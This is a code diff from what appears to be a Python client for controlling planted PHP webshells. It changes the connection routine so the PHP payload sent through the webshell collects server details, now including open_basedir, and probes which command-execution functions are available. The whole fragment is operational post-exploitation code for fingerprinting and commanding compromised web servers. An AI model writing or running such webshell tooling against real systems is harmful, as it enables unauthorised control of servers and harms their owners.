@@ -2,7 +2,7 @@ from os import path
 from urllib.parse import urlparse
 
 from libs.config import alias, color, gget, gset, set_namespace
-from libs.myapp import is_windows, print_webshell_info, send, get_system_template
+from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template
 
 """
 url ['webshell']
@@ -82,11 +82,11 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
     if "c4ca4238a0b923820d" in res.r_text:  # 验证是否成功连接
         gset("webshell.php_version", res.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
         info_req = send(
-            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions'));"
+            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions').'|'.ini_get('open_basedir'));"
         )
         info = info_req.r_text.strip().split("|")
         exec_func = send(get_detectd_exec_php()).r_text.strip()
-        get_system_template(exec_func)
+        prepare_system_template(exec_func)
         gset("webshell.root", info[0], namespace="webshell")
         gset("webshell.os_version", info[1], namespace="webshell")
         gset(
@@ -111,6 +111,7 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         disable_function_list = [f.strip() for f in info[5].split(",")]
         if ('' in disable_function_list):
             disable_function_list.remove('')
+        gset("webshell.obd", info[6], namespace="webshell")
         gset("webshell.disable_functions", disable_function_list, namespace="webshell")
         from_log = gget("webshell.from_log", "webshell")
         if not from_log:
